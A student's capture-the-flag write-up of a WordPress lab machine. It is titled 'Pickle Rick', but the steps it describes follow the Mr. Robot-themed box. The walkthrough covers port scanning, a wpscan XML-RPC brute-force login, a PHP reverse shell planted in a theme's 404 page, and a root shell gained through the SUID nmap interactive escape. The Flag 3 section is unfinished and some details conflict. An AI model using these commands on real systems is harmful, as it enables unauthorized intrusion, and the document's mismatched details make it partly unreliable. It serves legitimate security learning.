Overview
Field	Details
Lab / challenge	Pickle Rick (Rick and Morty)
Platform	TryHackMe
Category	Capture the Flag (CTF) · Web / Linux Security
Date completed	26/10/2026
Difficulty	Begginer/intermediate
Environment	Authorized CTF laboratory
Objective	Locate the three requested flags/ingredients in the challenge environment.


1. Objective and Scope
The goal of this challenge was to explore a deliberately vulnerable, Mr. Robot-themed environment and locate three pieces of information requested by the CTF. 
Work was performed exclusively within the authorized challenge infrastructure.

2. Lab Setup and Tools
- Operating system: Kali Linux VM
- Connectivity: Tryhackme VPN
- Target identifier: lab machine
- Tools used: terminal, browser
3. Methodology and Findings
3.1 Reconnaissance
Purpose: Identify available services, exposed interfaces, and initial points of attack.
Summary: Access and analyze ports to find and exploit a wordpress login 
- Actions performed: 
  -Send a small ping to verify I'm connected to the machine and mi vpn works
    - *ping -c2 10.66.173.68* 
      **successful**
  -Start a ports scan to identify probable vulnerabilities and export results into a grapeable format easy to read and reutilize
    - sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.66.173.68 -oG allports
    - We discover that 3 ports are open the http/80, ssh/22 and https/443
  -Start an aggresive scan to  ports to discover if information macthes and what servers are using
    - sudo nmap -p22,80,443 -sCV 10.66.173.68 -oN targeted
    - ssh is 8.2p1 on ubuntu, if I have true users I can try a brute force
    - http is on Apache on Ubuntu, but it don't has a title or version, I can try with curl -l but Im going to compare it with 443
    - https is on Apache TLS, the CN is not an IP so, Im going to save it, maybe I can use it later
  - I'm going to access to http and https in browser
    - Contains the same information in both urls
  - Lets numerate web directories of our page url
    - gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.66.173.68/ -t 30
    - Found a robots and many wordpress related content like a wp-login
    - Lets see robots.txt, because is plain text, it doesn't take too much time
      
      
3.3 Flag 1
- Location or discovery method: Directory hidden in robots.txt
- Technical reasoning: If I can check quick pages like this, we can obtain or not, important information in a short time
- Actions performed:
    - http://10.66.173.68/robots.txt
      - Oh, I found something interesting, User-agent: * , fsociety.dic and key1-of-3.txt
    - I'm going to download the dic to open the key.txt
    - wget http://10.66.173.68/fsociety.dic
      - Open the key and we have 1st flag
3.4 Flag 2
- Location or discovery method: WP XML-RCP exploit
- Technical reasoning: Using a remote call prodecure allow us to try obtain SU privileges
- Actions performed: 
  - I can't access with the url in browser, lets use WPScan
    - wpscan --url http://10.66.173.68/
  - I can see that is on an Apache server, XML-RCP is enabled, WP-Cron are enabled too, WP version, Uses twentyfifteen theme on CSS style 404 page
  - If I encountered the login, I need ussers and passwords, lets try
    - wpscan --url http://10.66.173.68/ --enumerate u
  - Nothing found, but to resolve the CTF a list of users and passwords were received 
    - wpscan --url http://10.66.173.68/ --usernames users.txt --passwords --password-attack xmlrpc
  - Un resultado favorable: Elliot pass: ER28-0652
  - Login was successfull
  - Now I'm moving to themes on te 404 page that uses twentyfifteen, a CVE in this version to add a reverse shell
    - cat /usr/share/webshells/php/php-reverse-shell.php
  - I copied it to the editor and apply changes, change the ip and port placeholder and now we need to setup that port
    - sudo nc -nlvp 443
  - I'm going to redirect to that 404 page
    - http://10.66.173.68/wp-content/themes/twentyfifteen/404.php
    - Reverse shell is active, Im going to give tty treatment
      - $export TERM = xterm
      - $script /dev/null -c bash
      - ctr+z
      - stty raw -echo;fg
      - reset xterm
    - Now I'm inside, so lets search what we can do now, navigate to home
      - cd /home/
      - ls    robot   ubuntu
      - cd robot/
      - ls    key-2of-3.txt  password.raw-md5
      - cat key-2of-3.txt  permission denied
    - I don't have required permissions, so I need to search for SU, the password is hashed, we are going to try other method with a binary exploit
      - /home/robot$ cd /
      - /$ find \-perm -4000 2>/dev/null
      - /$ ./usr/local/bin/nmap --interactive
    - Im going to launch a shell here
      - !sh
      - #whoami  root
    - Navigate to the previous flag and now its open 
  -Second flag done
3.5 Flag 3
- Location or discovery method: servers directory
- Technical reasoning: When we don´t see the responses, we can try to obtain all system control by using a privilege scalation when we are already inside the system
3.6 Privilege Escalation 
- Starting permissions: root
- Misconfiguration or weakness: server system
- How higher privileges were confirmed: whoami
- Security impact: Critic
- Actions performed:
  - Search for the 3rd flag navigating on directories
